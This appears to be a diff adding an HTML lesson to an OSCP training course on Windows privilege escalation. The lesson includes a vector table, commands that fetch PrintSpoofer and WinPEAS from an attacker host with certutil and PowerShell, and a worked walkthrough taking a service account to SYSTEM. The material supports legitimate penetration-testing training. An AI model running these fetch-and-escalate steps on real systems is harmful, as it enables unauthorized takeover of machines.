@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 07 · Windows Privilege Escalation</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0006-linux-privilege-escalation.html">Lesson 06</a> · <strong>Lesson 07</strong> · <a href="../reference/windows-privesc.html">Windows privesc</a> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 07 · Privilege Escalation</span>
+<h1>Windows Privilege Escalation</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: take a low-priv Windows shell to SYSTEM/Administrator by finding one misconfiguration.</p>
+
+<p class="lead">You have a shell as <code>iis apppool\defaultapppool</code> or some other low-priv service account. That's 10 points; <strong>SYSTEM</strong> is the other 10. This lesson is the twin of Lesson 06 — same reflex, different OS. You don't need a 0-day. You enumerate inward, find the <em>one</em> thing this box got wrong, and ride it to the highest token on the machine. On Windows that machine almost always handed you the win before you arrived.</p>
+
+<div class="box mantra">
+Different OS, same reflex.<br>
+Enumerate inward, find the one misconfiguration.
+</div>
+
+<h2>Step 1 · Situate yourself</h2>
+<p>Before hunting, answer "who am I, what do I already hold, and what is this box?" On Windows the cheapest tell is your <strong>token privileges</strong> — a single command frequently shows you already have everything you need:</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">whoami /priv</span>        <span class="c"># token privileges — the cheapest tell on Windows</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami /groups</span>      <span class="c"># am I in a privileged group? (Administrators, Backup Operators...)</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami /all</span>         <span class="c"># everything at once: user, groups, privileges</span>
+<span class="p">C:\&gt;</span> <span class="o">systeminfo</span>          <span class="c"># OS build + installed hotfixes (feeds kernel-exploit triage)</span>
+<span class="p">C:\&gt;</span> <span class="o">net user</span>            <span class="c"># local users; "net user bob" for one account's groups</span>
+<span class="p">C:\&gt;</span> <span class="o">net localgroup administrators</span>   <span class="c"># who is already admin</span>
+<span class="p">C:\&gt;</span> <span class="o">ipconfig /all</span>        <span class="c"># interfaces — note a second NIC (a pivot for later)</span></pre>
+<p>The instinct to build first: when <code>whoami /priv</code> shows <strong>SeImpersonatePrivilege</strong> or <strong>SeAssignPrimaryTokenPrivilege</strong>, you are usually one binary away from SYSTEM. That is so common on service-account shells that it is the very first thing to look for.</p>
+
+<h2>Step 2 · Sweep with WinPEAS — then read it</h2>
+<p>Drop <a href="https://github.com/peass-ng/PEASS-ng">WinPEAS</a> to enumerate the host fast, but <em>read</em> the red/yellow hits rather than outsourcing your judgement — same discipline as LinPEAS in Lesson 06.</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">winPEASx64.exe</span>            <span class="c"># full sweep; the .bat variant needs no binary drop</span>
+<span class="p">C:\&gt;</span> <span class="o">winPEASany.exe quiet servicesinfo</span>   <span class="c"># target one category to cut the noise</span></pre>
+<p>WinPEAS colour-codes findings: <strong>red = very likely exploitable</strong>, yellow = worth a look. Useful alternatives, each with a different bias:</p>
+<table>
+<thead><tr><th>Tool</th><th>What it is best at</th></tr></thead>
+<tbody>
+<tr><td><strong>WinPEAS</strong></td><td>Broad first sweep; colour-coded priorities across every vector</td></tr>
+<tr><td><strong>PrivescCheck.ps1</strong></td><td>PowerShell, no binary to drop; clean service + registry checks</td></tr>
+<tr><td><strong>Seatbelt</strong></td><td>C#; deep host survey (credentials, autologon, scheduled tasks)</td></tr>
+</tbody>
+</table>
+<p>The vectors these surface are almost always one of the rows below. Learn the table; the tools just point at the row.</p>
+
+<h2>Step 3 · The vectors that win Windows boxes</h2>
+<table>
+<thead><tr><th>Vector</th><th>The tell</th><th>The move</th></tr></thead>
+<tbody>
+<tr><td><strong>Token impersonation</strong></td><td><code>whoami /priv</code> shows <code>SeImpersonatePrivilege</code> / <code>SeAssignPrimaryToken</code> (common on IIS / MSSQL / service accounts)</td><td>A Potato — <strong>PrintSpoofer</strong>, GodPotato, JuicyPotato — coerces a SYSTEM token → SYSTEM shell</td></tr>
+<tr><td><strong>Unquoted service path</strong></td><td>Service binary path has a space and no quotes, and a parent dir is writable</td><td>Plant a malicious exe earlier in the path; restart the service → runs as the service account</td></tr>
+<tr><td><strong>Weak service perms</strong></td><td><code>accesschk</code> / <code>sc qc</code> show you can reconfigure a service</td><td><code>sc config &lt;svc&gt; binpath=</code> your payload, then restart → runs as the service account (often SYSTEM)</td></tr>
+<tr><td><strong>AlwaysInstallElevated</strong></td><td>Registry value = 1 in <em>both</em> HKLM <em>and</em> HKCU</td><td><code>msiexec /i evil.msi</code> installs as SYSTEM</td></tr>
+<tr><td><strong>Stored credentials</strong></td><td><code>cmdkey /list</code>, unattend.xml, Autologon registry, PuTTY/WinSCP sessions, SAM+SYSTEM hives</td><td>Reuse them — <code>runas /savecred</code>, or <code>secretsdump</code> the hives for hashes</td></tr>
+<tr><td><strong>Scheduled task</strong></td><td>A task runs as SYSTEM and calls a script/binary <em>you can write</em></td><td>Overwrite the target file with your payload; wait for the trigger</td></tr>
+<tr><td><strong>DLL hijacking</strong></td><td>A service/app loads a missing DLL from a writable dir on its search path</td><td>Drop a malicious DLL by that name → loaded into the privileged process</td></tr>
+<tr><td><strong>Kernel exploit</strong></td><td>Old build in <code>systeminfo</code> + a matching CVE (map with Watson / wesng)</td><td><em>Last resort</em> — can BSOD the box</td></tr>
+</tbody>
+</table>
+
+<div class="box warn">
+<span class="box-title">Order of operations — token before kernel</span>
+Work cheap-and-safe before risky: <strong>token privileges → service misconfigs → stored creds → registry (AlwaysInstallElevated) → kernel exploit last</strong>. ALWAYS run <code>whoami /priv</code> first — so many service-account shells already hold <code>SeImpersonate</code> that a Potato is your fastest path to SYSTEM and you skip the rest. A kernel exploit can blue-screen the machine and burn your exam time; exhaust misconfigurations first.
+</div>
+
+<h3>How to read each tell</h3>
+<p>The commands that confirm a service vector are worth memorising — these three answer most service questions:</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">wmic service get name,displayname,pathname,startmode</span>   <span class="c"># spot unquoted paths + spaces</span>
+<span class="p">C:\&gt;</span> <span class="o">sc qc &lt;service&gt;</span>            <span class="c"># BINARY_PATH_NAME + SERVICE_START_NAME (who it runs as)</span>
+<span class="p">C:\&gt;</span> <span class="o">accesschk.exe -uwcqv "user" *</span>   <span class="c"># services THIS user can modify (SERVICE_CHANGE_CONFIG = win)</span></pre>
+<p>For the registry vectors, two one-liners confirm a free SYSTEM shell:</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="p">C:\&gt;</span> <span class="o">reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span>
+<span class="c"># both must return 0x1. One alone does nothing.</span></pre>
+
+<h2>Step 4 · Get your tools onto the box</h2>
+<p>You'll need to drop WinPEAS, PrintSpoofer, or accesschk onto the target. Stand up a quick HTTP or SMB server on your attacker box (<code>10.10.14.5</code>) and pull. <code>certutil</code> is the classic Windows-native fetch (a <a href="https://lolbas-project.github.io/">LOLBAS</a> living-off-the-land binary):</p>
+<pre><span class="c"># --- on your attacker box: serve the file ---</span>
+<span class="p">$</span> <span class="o">python3 -m http.server 80</span>
+
+<span class="c"># --- on the target: certutil (native, often unblocked) ---</span>
+<span class="p">C:\&gt;</span> <span class="o">certutil -urlcache -f http://10.10.14.5/winPEASx64.exe wp.exe</span>
+
+<span class="c"># --- or PowerShell ---</span>
+<span class="p">C:\&gt;</span> <span class="o">powershell -c "iwr http://10.10.14.5/PrintSpoofer64.exe -OutFile ps.exe"</span>
+
+<span class="c"># --- or SMB: impacket-smbserver, then copy over the share ---</span>
+<span class="p">$</span> <span class="o">impacket-smbserver share . -smb2support</span>
+<span class="p">C:\&gt;</span> <span class="o">copy \\10.10.14.5\share\PrintSpoofer64.exe ps.exe</span></pre>
+<p>Write to a directory you can actually write to — <code>C:\Windows\Temp</code> and your own profile are safe bets when the working directory is locked down.</p>
+
+<h2>Worked example — SeImpersonatePrivilege → PrintSpoofer → SYSTEM</h2>
+<p>The single most common modern Windows service privesc. You land a shell from a web/MSSQL foothold and check your token first:</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">whoami</span>
+<span class="o">iis apppool\defaultapppool</span>
+<span class="p">C:\&gt;</span> <span class="o">whoami /priv</span>
+<span class="o">PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                        State</span>
+<span class="o">============================= ================================== =======</span>
+<span class="h">SeImpersonatePrivilege        Impersonate a client after auth    Enabled</span>
+<span class="o">SeCreateGlobalPrivilege       Create global objects              Enabled</span></pre>
+<p><code>SeImpersonatePrivilege</code> is <strong>Enabled</strong> — that is the whole game. Fetch PrintSpoofer, then have it impersonate a SYSTEM token and hand you an interactive shell:</p>
+<pre><span class="p">C:\&gt;</span> <span class="o">certutil -urlcache -f http://10.10.14.5/PrintSpoofer64.exe ps.exe</span>
+<span class="p">C:\&gt;</span> <span class="o">ps.exe -i -c cmd</span>
+<span class="o">[+] Found privilege: SeImpersonatePrivilege</span>
+<span class="o">[+] Named pipe listening...</span>
+<span class="o">[+] CreateProcessAsUser() OK</span>
+
+<span class="p">C:\&gt;</span> <span class="o">whoami</span>
+<span class="h">nt authority\system</span>
+<span class="p">C:\&gt;</span> <span class="o">type C:\Users\Administrator\Desktop\proof.txt</span>
+<span class="h">a1b2c3d4e5f6...   (the second 10 points)</span></pre>
+<p>SYSTEM. The pattern generalises across the Potatoes: <em>if you can impersonate, you can become SYSTEM.</em> Record the exact path you took — token vector, tool, command — in your box notes; that note is what makes the next box faster.</p>
+
+<div class="box tip">
+<span class="box-title">If a Potato fails</span>
+PrintSpoofer is the modern default. On older boxes (Server 2016 / Windows 10 1809 and earlier) <strong>JuicyPotato</strong> still works; on most current builds reach for <strong>GodPotato</strong> or RoguePotato. Same prerequisite every time: <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> in your token. Confirm the privilege, then pick the Potato that matches the OS build.
+</div>
+
+<h2>Check yourself</h2>
+<p>Retrieve before you reason — feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — your Windows privesc map</span>
+<a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html">HackTricks — Windows Local Privilege Escalation</a> is the checklist to work top-to-bottom on every Windows box; pair it with <a href="https://github.com/peass-ng/PEASS-ng">WinPEAS</a> for the automated sweep and <a href="https://lolbas-project.github.io/">LOLBAS</a> when you need a native binary to fetch files or run code.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 08</span>
+On a Windows box where you hold a low-priv shell (any TJ Null Windows target on Hack The Box / Proving Grounds), run <code>whoami /priv</code> and WinPEAS, then escalate to SYSTEM <em>by hand</em> via ONE vector. Record the exact path — vector, tool, command — in your notes under "Privilege escalation". Foothold <em>and</em> SYSTEM on one box is the whole exam in miniature.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Start:</strong> <strong>Optimum</strong> (HFS RCE → MS16-032) &amp; <strong>Devel</strong> (webroot shell → kernel) — HTB · Windows · Easy. <strong>Then:</strong> Jeeves / Bastard for token abuse; PG Algernon for <code>SeImpersonate</code>. <a href="../reference/practice-boxes.html#pb-07">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Paste me your <code>whoami /priv</code> or WinPEAS output and we'll spot the vector together. Next: <strong>Lesson 08 — Password Attacks &amp; Credential Reuse</strong> — the hashes and stored creds you loot during privesc become keys to the next box.
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html">HackTricks — Windows Local Privilege Escalation</a> (the full enumeration + exploitation checklist) · <a href="https://github.com/peass-ng/PEASS-ng">WinPEAS (PEASS-ng)</a> (automated sweep) · <a href="https://lolbas-project.github.io/">LOLBAS</a> (living-off-the-land binaries). Local commands: <a href="../reference/windows-privesc.html">Windows privesc cheatsheet</a>.</li>
+</ol>
+
+<footer>
+<span><a href="./0006-linux-privilege-escalation.html">← Lesson 06: Linux Privilege Escalation</a></span>
+<span><a href="./0008-password-attacks-and-credential-reuse.html">Next → Lesson 08: Password Attacks &amp; Credential Reuse</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "You land a low-priv Windows shell. Which single command is the cheapest tell for the fastest path to SYSTEM?",
+    options: ["whoami /priv", "systeminfo", "ipconfig /all", "net localgroup administrators"],
+    answer: 0,
+    explain: "Token privileges are the cheapest win on Windows — SeImpersonate in the output usually means SYSTEM is one Potato away."
+  },
+  {
+    prompt: "whoami /priv shows SeImpersonatePrivilege is Enabled. What's the best next move?",
+    options: ["Run a Potato (PrintSpoofer) to grab a SYSTEM token", "Brute-force the Administrator password", "Compile a kernel exploit from systeminfo", "Reboot the box to reset the token"],
+    answer: 0,
+    explain: "SeImpersonate lets a Potato impersonate a SYSTEM token — the most common modern Windows service privesc."
+  },
+  {
+    prompt: "A service binary is at C:\\Program Files\\My App\\svc.exe, unquoted, and you can write to C:\\Program Files. The move is to:",
+    options: ["Plant a malicious exe earlier in the path and restart the service", "Delete the service so it stops running", "Crack the service account's password offline", "Edit the exe in place with a hex editor"],
+    answer: 0,
+    explain: "An unquoted path with a space lets Windows try C:\\Program.exe first; plant your exe there, restart, and it runs as the service account."
+  },
+  {
+    prompt: "When does AlwaysInstallElevated give you a SYSTEM shell via msiexec?",
+    options: ["When the registry value is 1 in BOTH HKLM and HKCU", "When it is 1 in HKLM only", "When it is 1 in HKCU only", "Whenever the Windows Installer service is running"],
+    answer: 0,
+    explain: "Both the HKLM and HKCU keys must be set to 1; either one alone does nothing, and then msiexec /i evil.msi runs as SYSTEM."
+  },
+  {
+    prompt: "accesschk shows your user has SERVICE_CHANGE_CONFIG on a service running as SYSTEM. What do you do?",
+    options: ["sc config the binPath to your payload, then restart the service", "Wait for the service to crash on its own", "Read the service's source code for bugs", "Disable the service to lower its privileges"],
+    answer: 0,
+    explain: "Writable service config lets you set binPath to add an admin or run a payload; restarting the service executes it as SYSTEM."
+  },
+  {
+    prompt: "Which Windows privesc vector should you try LAST, because it can crash the box?",
+    options: ["A kernel exploit matched from systeminfo", "A Potato via SeImpersonatePrivilege", "Reusing credentials from cmdkey /list", "Hijacking a writable service's binPath"],
+    answer: 0,
+    explain: "Kernel exploits can blue-screen the machine and cost exam time — exhaust token, service, and credential vectors first."
+  }
+]);
+</script>
+
+</body>
+</html>
